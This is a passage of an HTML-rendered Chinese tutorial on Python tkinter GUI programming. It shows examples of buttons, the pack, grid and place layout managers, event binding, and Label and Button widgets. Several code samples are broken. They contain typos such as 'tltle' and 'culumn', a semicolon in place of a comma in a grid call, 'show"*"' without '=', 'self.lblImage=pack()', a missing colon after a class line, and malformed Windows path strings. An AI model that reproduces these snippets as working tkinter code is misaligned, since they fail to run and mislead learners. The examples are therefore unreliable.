comment" spellcheck="true">#设置btnSayHi的text属性</span>btnSayHi<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用组件的pack方法，调整其显示位置和大小</span><span class="token keyword">def</span> <span class="token function">sayHi</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#定义事件处理程序</span>    messagebox<span class="token punctuation">.</span>showinfo<span class="token punctuation">(</span><span class="token string">"Message"</span><span class="token punctuation">,</span><span class="token string">"Hello,world!"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#弹出消息框</span>btnSayHi<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token string">"&lt;Button-1>"</span><span class="token punctuation">,</span>sayHi<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#绑定事件处理程序，鼠标左键</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用组件的mainloop方法，进入事件循环</span></code></pre><p><strong>例2：创建GUI应用程序类</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk<span class="token comment" spellcheck="true">#import tkinter.messagebox</span><span class="token keyword">class</span> <span class="token class-name">Application</span><span class="token punctuation">(</span>tk<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#定义GUI应用程序类，派生于Frame类</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>master<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#构造函数，master为父窗口</span>        tk<span class="token punctuation">.</span>Frame<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span>master<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用父类的构造函数</span>        self<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用组件的pack方法，调整其显示位置和大小</span>        self<span class="token punctuation">.</span>createWidgets<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用对象方法，创建子组件</span>    <span class="token keyword">def</span> <span class="token function">createWidgets</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#对象方法：创建子组件</span>        self<span class="token punctuation">.</span>btnSayHi<span class="token operator">=</span>tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建按钮组件btnSayHi</span>        self<span class="token punctuation">.</span>btnSayHi<span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"Hello"</span>    <span class="token comment" spellcheck="true">#设置显示文本属性</span>        self<span class="token punctuation">.</span>btnSayHi<span class="token punctuation">[</span><span class="token string">"command"</span><span class="token punctuation">]</span><span class="token operator">=</span>self<span class="token punctuation">.</span>sayHi    <span class="token comment" spellcheck="true">#设置命令属性，绑定事件处理程序</span>        self<span class="token punctuation">.</span>btnSayHi<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用组件的pack方法，调整其显示位置和大小</span>        <span class="token comment" spellcheck="true">#创建按钮组件btnQuit，其显示文本为“Quit”，command=root.destroy</span>        self<span class="token punctuation">.</span>btnQuit<span class="token operator">=</span>tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"Quit"</span><span class="token punctuation">,</span>command<span class="token operator">=</span>root<span class="token punctuation">.</span>destroy<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>btnQuit<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用组件的pack方法，调整其显示位置和大小</span>    <span class="token keyword">def</span> <span class="token function">sayHi</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#定义事件处理程序</span>        tk<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>showinfo<span class="token punctuation">(</span><span class="token string">"Message"</span><span class="token punctuation">,</span><span class="token string">"Hello,world!"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#弹出消息框</span>root<span class="token operator">=</span>tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建1个Tk根窗口组件root</span>app<span class="token operator">=</span>Application<span class="token punctuation">(</span>master<span class="token operator">=</span>root<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建Application的对象实例</span>app<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用组件的mainloop方法，进入事件循环</span></code></pre><h3 id="3-几种布局管理器"><a href="#3-几种布局管理器" class="headerlink" title="3.几种布局管理器"></a>3.几种布局管理器</h3><ul><li>pack、grid和place</li><li>pack几何布局管理器：<br><img src="https://www.hualigs.cn/image/60607069a8d37.jpg" alt=""></li></ul><p><strong>例3：Pack几何布局示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>tltle<span class="token punctuation">(</span><span class="token string">"登录"</span><span class="token punctuation">)</span>f1<span class="token operator">=</span>Frame<span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>f1<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#界面分为上下3个Frame，f1放置第1行标签和文本框</span>f2<span class="token operator">=</span>Frame<span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>f2<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#f2放置第2行标签和文本框</span>f3<span class="token operator">=</span>Frame<span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>f3<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#f3放置第3行2个按钮</span>Label<span class="token punctuation">(</span>f1<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"用户名"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>LEFT<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#标签放置在f1中，左停靠</span>Entry<span class="token punctuation">(</span>f1<span class="token punctuation">)</span><span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>LEFT<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#单行文本框放置在f1中，左停靠</span>Label<span class="token punctuation">(</span>f2<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"密码"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>LEFT<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#标签放置在f2中，左停靠</span>Entry<span class="token punctuation">(</span>f2<span class="token punctuation">,</span>show<span class="token operator">=</span><span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>LEFT<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#单行文本框放置在f2中，左停靠</span>Button<span class="token punctuation">(</span>f3<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"登录"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>RIGHT<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#按钮放置在f3中，右停靠</span>Button<span class="token punctuation">(</span>f3<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"取消"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>RIGHT<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#按钮放置在f3中，右停靠</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用组件的mainloop方法，进入事件循环</span></code></pre><ul><li>grid几何布局管理器：<br><img src="https://www.hualigs.cn/image/6060706adbe49.jpg" alt=""></li></ul><p><strong>例4：Grid几何布局示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"登录"</span><span class="token punctuation">)</span>Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"用户名"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>column<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#用户名标签放置在第0行第0列</span>Entry<span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>columnspan<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#用户名文本框放置在第0行第1列，跨2列</span>Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"密码"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>culumn<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#密码标签放置在第1行第0列</span>Entry<span class="token punctuation">(</span>root<span class="token punctuation">,</span>show<span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>columnspan<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#密码文本框放置第1行第1列，跨2列</span>Button<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"登录"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>sticky<span class="token operator">=</span>E<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#登录按钮右侧贴紧</span>Button<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"取消"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>column<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>sticky<span class="token operator">=</span>W<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#取消按钮左侧贴紧</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用组件的mainloop方法，进入事件循环</span></code></pre><ul><li>place几何布局管理器<br><img src="https://www.hualigs.cn/image/60607069bdab3.jpg" alt=""></li></ul><p><strong>例5：Place几何布局示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"登录"</span><span class="token punctuation">)</span>root<span class="token punctuation">[</span><span class="token string">'width'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">200</span>    <span class="token comment" spellcheck="true">#窗口宽度</span>root<span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">80</span>    <span class="token comment" spellcheck="true">#窗口高度</span>Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"用户名"</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#用户名标签，绝对坐标(1,1)</span><span class="token comment" spellcheck="true">#width是字符，绝对坐标是像素</span>Entry<span class="token punctuation">(</span>root<span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">45</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#用户名文本框，绝对坐标(45,1)</span>Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"密码"</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#密码标签，绝对坐标(1,20)</span>Entry<span class="token punctuation">(</span>root<span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span>show<span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">45</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#密码文本框，绝对坐标(45,25)</span>Button<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"登录"</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#登录按钮，绝对坐标(40,40)</span>Button<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"取消"</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">110</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#取消按钮，绝对坐标(110,40)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用组件的mainloop方法，进入事件循环</span></code></pre><h3 id="4-事件处理"><a href="#4-事件处理" class="headerlink" title="4.事件处理"></a>4.事件处理</h3><ul><li>事件类型<ul><li>用户通过鼠标和键盘与图形用户界面交互时，会触发事件</li></ul></li></ul><p>例如：<br><img src="https://www.hualigs.cn/image/606070671f297.jpg" alt=""></p><ul><li><p>事件绑定</p><ul><li>1.通过command属性绑定（适合简单不需获取event对象）<ul><li>Button(root,text=”登录”,command=login)</li></ul></li><li>2.通过bind()方法绑定（适合需要获取event对象）<ul><li>c1=Canvas();</li><li>c1.bind(“<button-1>“,drawLine)</button-1></li></ul></li></ul></li><li><p>组件类的绑定</p><ul><li>调用对象的bind_class函数， 将该组件类所有的组件绑定事件：<ul><li>w.bind_class(“Widget”,”event”,eventhanler)</li><li>btn01.bind_class(“Button”,”<button-1>“,func)</button-1></li></ul></li></ul></li><li><p>事件处理函数<br><img src="https://www.hualigs.cn/image/6060706699214.jpg" alt=""></p></li></ul><p><strong>例6：事件处理示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"事件处理"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">printEvent</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#事件处理函数</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'当前坐标位置：'</span><span class="token punctuation">,</span>event<span class="token punctuation">.</span>x<span class="token punctuation">,</span>event<span class="token punctuation">.</span>y<span class="token punctuation">)</span>root<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token string">'&lt;Button-1>'</span><span class="token punctuation">,</span>printEvent<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#单击鼠标左键</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用组件的mainloop方法，进入事件循环</span></code></pre><h3 id="5-Tkinter-GUI编程与绘画"><a href="#5-Tkinter-GUI编程与绘画" class="headerlink" title="5.Tkinter GUI编程与绘画"></a>5.Tkinter GUI编程与绘画</h3><ul><li><p>根窗体就是画板，在tkinter中是Toplevel</p></li><li><p>画布就是tkinter中的容器（Frame），tkinter中的容器也可以放多个容器</p></li><li><p>绘画中的构图布局则是tkinter的布局管理器（几何管理器）</p></li><li><p>绘画的内容就是tkinter中的一个个小组件，一幅画由许多元素构成，而GUI界面，是一个个组件拼装的，它们就是widget</p></li><li><p>常用组件（WIDGET）<br><img src="https://www.hualigs.cn/image/6060707a5c94e.jpg" alt=""></p></li><li><p>在创建对象时，使用关键字参数</p><ul><li>b1=Button(self,fg=”red”,bg=”blue”)</li><li>b=Button(master,text=”OK”,command=self.ok)</li></ul></li><li><p>创建对象后，将选项名称视为字典索引</p><ul><li>b1[“fg”]=”red”</li><li>b1[“bg”]=””blue”</li></ul></li><li><p>使用config()方法更新对象创建后的多个attrs</p><ul><li>b1.config(fg=”red”,bg=”blue”)</li></ul></li><li><p>标准属性也就是所有空间的共同属性，如大小、字体和颜色等<br><img src="https://www.hualigs.cn/image/60607066dedb3.jpg" alt=""></p></li></ul><h3 id="6-常用组件"><a href="#6-常用组件" class="headerlink" title="6.常用组件"></a>6.常用组件</h3><ul><li>标签Label：显示文本/图像</li></ul><p><strong>例7：Label示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"Label示例"</span><span class="token punctuation">)</span>w<span class="token operator">=</span>Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"姓名"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建Label组件对象，显示文本为“姓名”</span>w<span class="token punctuation">.</span>config<span class="token punctuation">(</span>width<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span>bg<span class="token operator">=</span><span class="token string">'black'</span><span class="token punctuation">,</span>fg<span class="token operator">=</span><span class="token string">'white'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#设置宽度、背景色、前景色</span>w<span class="token punctuation">[</span><span class="token string">'anchor'</span><span class="token punctuation">]</span><span class="token operator">=</span>E    <span class="token comment" spellcheck="true">#设置停靠方式为右对齐</span>w<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用pack方法，调整其显示位置和大小</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用组件的mainloop方法，进入事件循环</span></code></pre><ul><li>标签框架LabelFrame<ul><li>带标签的矩形框架，主要用于包含若干组件</li></ul></li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"LabelFrame"</span><span class="token punctuation">)</span>lf<span class="token operator">=</span>LabelFrame<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"组1"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建LabelFrame组件对象</span>lf<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用pack方法，调整其显示位置和大小</span>Button<span class="token punctuation">(</span>lf<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"确定"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>LEFT<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#确定按钮，左停靠</span>Button<span class="token punctuation">(</span>lf<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"取消"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>LEFT<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#取消按钮，左停靠</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用组件的mainloop方法，进入事件循环</span></code></pre><ul><li>按钮Button：执行用户的单击操作</li></ul><p><strong>例8：Button示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"Button"</span><span class="token punctuation">)</span>    w<span class="token operator">=</span>Button<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"确定"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建Button组件对象，显示文本为“确定”</span>w<span class="token punctuation">.</span>config<span class="token punctuation">(</span>state<span class="token operator">=</span>DISABLED<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#设置Button组件的状态为禁用</span>w<span class="token punctuation">[</span><span class="token string">'width'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">20</span>    <span class="token comment" spellcheck="true">#设置宽度</span>w<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用pack方法，调整其显示位置和大小</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用组件的mainloop方法，进入事件循环</span></code></pre><p><strong>例9：Label和Button应用示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk<span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">Application</span><span class="token punctuation">(</span>tk<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#定义GUI应用程序类，派生于Frame类</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>master<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#构造函数，master为父窗口</span>        self<span class="token punctuation">.</span>files<span class="token operator">=</span>os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>r'c<span class="token punctuation">:</span>\pythonpa\images\gif<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#获取图像文件名列表</span>        self<span class="token punctuation">.</span>index<span class="token operator">=</span><span class="token number">0</span>    <span class="token comment" spellcheck="true">#图片索引，初始显示第1张图片</span>        self<span class="token punctuation">.</span>img<span class="token operator">=</span>tk<span class="token punctuation">.</span>PhotoImage<span class="token punctuation">(</span>file<span class="token operator">=</span>r<span class="token string">'c:\python[a\images\gif+'</span>\\'<span class="token operator">+</span>self<span class="token punctuation">.</span>files<span class="token punctuation">[</span>self<span class="token punctuation">.</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span>        tk<span class="token punctuation">.</span>Frame<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span>master<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用父类的构造函数</span>        self<span class="token punctuation">.</span>createWidget<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用对象方法，创建子组件</span>    <span class="token keyword">def</span> <span class="token function">createWidget</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#对象方法：创建子组件</span>        self<span class="token punctuation">.</span>lblImage<span class="token operator">=</span>tk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>self<span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">300</span><span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">300</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建Label组件，显示图片</span>        self<span class="token punctuation">.</span>lblImage<span class="token operator">=</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>f<span class="token operator">=</span>tk<span class="token punctuation">.</span>Frame<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建窗口框架</span>        self<span class="token punctuation">.</span>f<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>btnPrev<span class="token operator">=</span>tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>f<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"上一张"</span><span class="token punctuation">,</span>command<span class="token operator">=</span>self<span class="token punctuation">.</span>prev<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建按钮组件</span>        self<span class="token punctuation">.</span>btnPrev<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>tk<span class="token punctuation">.</span>LEFT<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>btnNext<span class="token operator">=</span>tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>f<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"下一张"</span><span class="token punctuation">,</span>command<span class="token operator">=</span>self<span class="token punctuation">.</span>next<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建按钮组件</span>        self<span class="token punctuation">.</span>btnNext<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>LEFT<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">prev</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#定义事件处理程序</span>        self<span class="token punctuation">.</span>showfile<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#显示上一张图片</span>    <span class="token keyword">def</span> <span class="token function">next</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#定义事件处理程序</span>        self<span class="token punctuation">.</span>showfile<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#显示下一张图片</span>    <span class="token keyword">def</span> <span class="token function">showfile</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#显示图片</span>        self<span class="token punctuation">.</span>index<span class="token operator">+=</span>n        <span class="token keyword">if</span> self<span class="token punctuation">.</span>index<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>index<span class="token operator">=</span>len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>files<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>    <span class="token comment" spellcheck="true">#循环显示最后1张</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>index<span class="token operator">></span>len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>files<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>index<span class="token operator">=</span><span class="token number">0</span>    <span class="token comment" spellcheck="true">#循环显示第1张</span>        self<span class="token punctuation">.</span>img<span class="token operator">=</span>tk<span class="token punctuation">.</span>PhotoImage<span class="token punctuation">(</span>file<span class="token operator">=</span>r<span class="token string">'c:\pythonpa\images\gif+'</span>\\<span 